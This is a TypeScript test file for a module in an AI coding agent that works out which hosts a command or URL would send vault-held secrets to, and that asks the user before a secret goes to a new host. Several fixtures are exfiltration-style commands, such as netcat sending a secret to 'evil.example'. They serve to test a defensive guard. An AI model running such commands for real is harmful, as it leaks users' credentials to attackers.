import { describe, expect, test } from "bun:test"
import { Effect } from "effect"
import { Agent } from "@opencode/schema/agent"
import { Project } from "@opencode/schema/project"
import { Session } from "@opencode/schema/session"
import { SessionMessage } from "@opencode/schema/session-message"
import { Permission } from "../src/permission.js"
import { Tool } from "../src/tool.js"
import { Vault } from "../src/vault/vault.js"
import { VaultHosts } from "../src/vault/hosts.js"

// Every fixture is assembled from parts so no secret scanner mistakes it for a real credential.
const token = "ghp" + "_" + "h".repeat(36)
const projectID = Project.ID.make("prj_vault_hosts")
const context = {
  sessionID: Session.ID.make("ses_vault_hosts"),
  agent: Agent.ID.make("build"),
  messageID: SessionMessage.ID.make("msg_vault_hosts"),
  id: Tool.CallID.make("call_vault_hosts"),
  progress: () => Effect.void,
}

describe("VaultHosts destinations", () => {
  test("reads hosts from URLs and remotes, and programs from local commands", () => {
    expect(VaultHosts.shell(['curl -s -H "Authorization: Bearer {vault:t}" https://api.github.com/user'])).toEqual({
      known: ["api.github.com"],
    })
    expect(VaultHosts.shell(["wget --header=X-Key:{vault:t} http://Example.COM:8080/x"])).toEqual({
      known: ["example.com"],
    })
    expect(VaultHosts.shell(["git push git@github.com:org/repo.git"])).toEqual({ known: ["github.com"] })
    expect(VaultHosts.shell(["ssh deploy@203.0.113.7 'echo {vault:t}'"])).toEqual({ known: ["203.0.113.7"] })
    expect(VaultHosts.shell(['psql "postgres://app:{vault:t}@db.example.com/app"'])).toEqual({
      known: ["db.example.com"],
    })
    expect(VaultHosts.shell(['psql "{vault:t}" -c "select 1"'])).toEqual({ known: ["cmd:psql"] })
    expect(VaultHosts.shell(["export TOKEN={vault:t}", "./deploy.sh"])).toEqual({ known: ["cmd:export"] })
  })

  test("cannot tell a destination named by a variable or a reference, or a network program without one", () => {
    expect(VaultHosts.shell(['curl -H "X: {vault:t}" "$BASE/login"'])).toEqual({ unknown: true })
    expect(VaultHosts.shell(["curl https://{vault:host}/x"])).toEqual({ unknown: true })
    expect(VaultHosts.shell(["printf %s {vault:t}", "nc evil.example 80"])).toEqual({ unknown: true })
    expect(VaultHosts.shell(["timeout 5 nc evil.example 80"])).toEqual({ unknown: true })
    expect(VaultHosts.url("https://api.example.com/items?key={vault:t}")).toEqual({ known: ["api.example.com"] })
    expect(VaultHosts.url("https://{vault:t}.example.com/")).toEqual({ unknown: true })
  })

  test("reads the program past wrappers and assignments, and ignores segments without a reference", () => {
    const cases: ReadonlyArray<readonly [ReadonlyArray<string>, VaultHosts.Destinations]> = [
      [["sudo env FOO=1 nice ./deploy.sh {vault:t}"], { known: ["cmd:deploy.sh"] }],
      [["TOKEN={vault:t} ./bin/Release"], { known: ["cmd:release"] }],
      [["TOKEN={vault:t}"], { known: ["cmd:shell"] }],
      [["ls -la", "echo done"], { known: [] }],
      [["printf %s {vault:t}", "printf %s {vault:u}"], { known: ["cmd:printf"] }],
      [["'curl' -H 'X: {vault:t}' 'https://API.example.com/x'"], { known: ["api.example.com"] }],
      [["sudo /usr/bin/curl -H 'X: {vault:t}'"], { unknown: true }],
      [["echo git@github.com:org/repo.git {vault:t}"], { known: ["cmd:echo"] }],
    ]
    cases.forEach(([segments, destinations]) => expect(VaultHosts.shell(segments)).toEqual(destinations))
  })

  test("reads remotes for the programs that take them", () => {
    const cases: ReadonlyArray<readonly [string, VaultHosts.Destinations]> = [
      ["scp ./key.pem deploy@Host.Example:/tmp/", { known: ["host.example"] }],
      ["rsync -a ./dist/ web.example:/srv/app", { known: ["web.example"] }],
      ["sftp deploy@files.example", { known: ["files.example"] }],
      ["git clone deploy@git.example:org/repo.git", { known: ["git.example"] }],
      // Only ssh and sftp read a bare login as a host; git needs the remote form.
      ["git push deploy@git.example {vault:t}", { unknown: true }],
      ["ssh -i {vault:t} jump", { unknown: true }],
    ]
    cases.forEach(([segment, destinations]) => expect(VaultHosts.shell([segment])).toEqual(destinations))
  })

  test("reads the host of a URL behind credentials, and none from a variable, an escape or no URL", () => {
    expect(VaultHosts.url("https://me:{vault:t}@api.example.com/x")).toEqual({ known: ["api.example.com"] })
    expect(VaultHosts.url("http://[::1]:8080/x?key={vault:t}")).toEqual({ known: ["[::1]"] })
    expect(VaultHosts.url("https://$HOST/x?key={vault:t}")).toEqual({ unknown: true })
    expect(VaultHosts.url("https://api%2eexample.com/x")).toEqual({ unknown: true })
    expect(VaultHosts.url("https:///x")).toEqual({ unknown: true })
    expect(VaultHosts.url("not a url {vault:t}")).toEqual({ unknown: true })
    expect(VaultHosts.shell(["curl -H 'X: {vault:t}' https://`hostname`/x"])).toEqual({ unknown: true })
  })

  test("asks for a first use, not for an allowed host, and again for a different host", () => {
    const none = new Map<string, ReadonlyArray<string>>()
    expect(VaultHosts.pending(["t"], ["api.github.com"], none)).toEqual([{ name: "t", destination: "api.github.com" }])
    const allowed = new Map([["t", ["api.github.com"]]])
    expect(VaultHosts.pending(["t"], ["api.github.com"], allowed)).toEqual([])
    expect(VaultHosts.pending(["t"], ["evil.example"], allowed)).toEqual([{ name: "t", destination: "evil.example" }])
    expect(VaultHosts.isHost("cmd:psql")).toBe(false)
    expect(VaultHosts.isHost("api.github.com")).toBe(true)
  })
})

describe("VaultHosts.approve", () => {
  const setup = (reply: Permission.Decision) => {
    const vault = Vault.make()
    const asked: Permission.AssertInput[] = []
    const permission: Permission.Interface = {
      close: Effect.void,
      evaluate: () => Effect.succeed("ask"),
      explicit: () => Effect.succeed(false),
      ask: (input) => Effect.succeed({ id: input.id ?? Permission.ID.create(), effect: "ask" }),
      assert: (input) => Effect.sync(() => void asked.push(input)),
      decide: (input) => Effect.sync(() => asked.push(input)).pipe(Effect.as(reply)),
      reply: () => Effect.void,
      get: () => Effect.succeed(undefined),
      forSession: () => Effect.succeed([]),
      list: () => Effect.succeed([]),
    }
    const name = Effect.runSync(vault.set({ projectID, name: "github-token", value: token, origin: "user" }))
    const approve = (destinations: VaultHosts.Destinations) =>
      Effect.runPromise(
        VaultHosts.approve({ permission, context, names: [name], destinations, detail: { command: "curl …" } }).pipe(
          Effect.provideService(Vault.Current, Vault.bind(vault, projectID)),
        ),
      )
    return { vault, asked, name, approve, permission }
  }

  test("remembers an always on the secret, so the same host is not asked again", async () => {
    const fixture = setup("always")
    await fixture.approve({ known: ["api.github.com"] })
    await fixture.approve({ known: ["api.github.com"] })
    expect(fixture.asked).toHaveLength(1)
    expect(fixture.asked[0]).toMatchObject({
      action: "vault",
      resources: ["github-token@api.github.com"],
      save: ["github-token@api.github.com"],
      force: true,
      metadata: { secrets: ["github-token"], destinations: ["api.github.com"], command: "curl …" },
    })
    expect((await Effect.runPromise(fixture.vault.list(projectID)))[0]?.hosts).toEqual(["api.github.com"])
    await fixture.approve({ known: ["evil.example"] })
    expect(fixture.asked).toHaveLength(2)
    expect(JSON.stringify(fixture.asked)).not.toContain(token)
  })

  test("asks every time after a once, and never offers always for an unknown destination", async () => {
    const fixture = setup("once")
    await fixture.approve({ known: ["api.github.com"] })
    await fixture.approve({ known: ["api.github.com"] })
    await fixture.approve({ unknown: true })
    expect(fixture.asked.map((input) => input.save)).toEqual([
      ["github-token@api.github.com"],
      ["github-token@api.github.com"],
      [],
    ])
    expect((await Effect.runPromise(fixture.vault.list(projectID)))[0]?.hosts).toBeUndefined()
  })

  test("covers every pending pair in one prompt, skips allowed pairs, and asks nothing for no names", async () => {
    const fixture = setup("always")
    const binding = Vault.bind(fixture.vault, projectID)
    const second = Effect.runSync(
      fixture.vault.set({ projectID, name: "npm-token", value: "npm" + "_" + "n".repeat(36), origin: "user" }),
    )
    Effect.runSync(fixture.vault.allow({ projectID, name: fixture.name, destination: "api.github.com" }))
    const approve = (names: ReadonlyArray<string>) =>
      Effect.runPromise(
        VaultHosts.approve({
          permission: fixture.permission,
          context,
          names,
          destinations: { known: ["api.github.com", "registry.npmjs.org"] },
          detail: { url: "https://registry.npmjs.org/" },
        }).pipe(Effect.provideService(Vault.Current, binding)),
      )
    await approve([fixture.name, second])
    expect(fixture.asked).toHaveLength(1)
    expect(fixture.asked[0]).toMatchObject({
      resources: ["github-token@registry.npmjs.org", "npm-token@api.github.com", "npm-token@registry.npmjs.org"],
      metadata: {
        secrets: ["github-token", "npm-token"],
        destinations: ["registry.npmjs.org", "api.github.com"],
        url: "https://registry.npmjs.org/",
      },
    })
    await approve([fixture.name, second])
    await approve([])
    expect(fixture.asked).toHaveLength(1)
    expect(JSON.stringify(fixture.asked)).not.toContain(token)
  })

  test("fails with the user's decline for a known or an unknown destination and remembers nothing", async () => {
    const fixture = setup("always")
    const declined = new Permission.CorrectedError({ feedback: "not to that host" })
    const permission: Permission.Interface = {
      ...fixture.permission,
      assert: () => Effect.fail(declined),
      decide: () => Effect.fail(declined),
    }
    const approve = (destinations: VaultHosts.Destinations) =>
      Effect.runPromise(
        VaultHosts.approve({ permission, context, names: [fixture.name], destinations, detail: {} }).pipe(
          Effect.flip,
          Effect.provideService(Vault.Current, Vault.bind(fixture.vault, projectID)),
        ),
      )
    expect(await approve({ known: ["api.github.com"] })).toBe(declined)
    expect(await approve({ unknown: true })).toBe(declined)
    expect((await Effect.runPromise(fixture.vault.list(projectID)))[0]?.hosts).toBeUndefined()
  })

  test("asks nothing outside a Session's tool execution", async () => {
    const fixture = setup("always")
    await Effect.runPromise(
      VaultHosts.approve({
        permission: fixture.permission,
        context,
        names: [fixture.name],
        destinations: { known: ["api.github.com"] },
        detail: {},
      }),
    )
    expect(fixture.asked).toEqual([])
  })
})
